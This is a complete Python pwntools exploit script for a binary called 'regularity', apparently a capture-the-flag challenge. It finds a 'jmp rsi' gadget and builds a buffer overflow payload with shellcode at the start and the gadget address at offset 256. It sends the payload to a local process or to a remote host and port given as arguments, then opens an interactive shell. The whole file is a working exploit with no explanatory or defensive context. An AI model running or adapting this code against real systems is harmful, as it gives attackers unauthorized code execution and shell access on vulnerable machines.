#!/usr/bin/env python3
from pwn import *
import os, sys, argparse

context.binary = './regularity'
elf = context.binary

def get_process(args):
    if args.host and args.port:
        return remote(args.host, int(args.port))
    return process(elf.path)

def find_jmp_rsi(elf):
    gadget = next(elf.search(asm('jmp rsi')))
    log.success(f"'jmp rsi' gadget found at: {hex(gadget)}")
    return gadget

def build_payload(offset=256):
    jmp_rsi_addr = find_jmp_rsi(elf)
    shellcode = asm(shellcraft.sh())
    payload = flat({
        0: shellcode,
        offset: jmp_rsi_addr
    })
    return payload

def trigger_exploit(p, payload):
    p.sendlineafter(b'days?', payload)

def main():
    parser = argparse.ArgumentParser(description="Exploit script for 'regularity'")
    parser.add_argument('--host', help='Remote host')
    parser.add_argument('--port', help='Remote port')
    args = parser.parse_args()

    p = get_process(args)
    payload = build_payload()
    trigger_exploit(p, payload)
    p.interactive()

if __name__ == "__main__":
    main()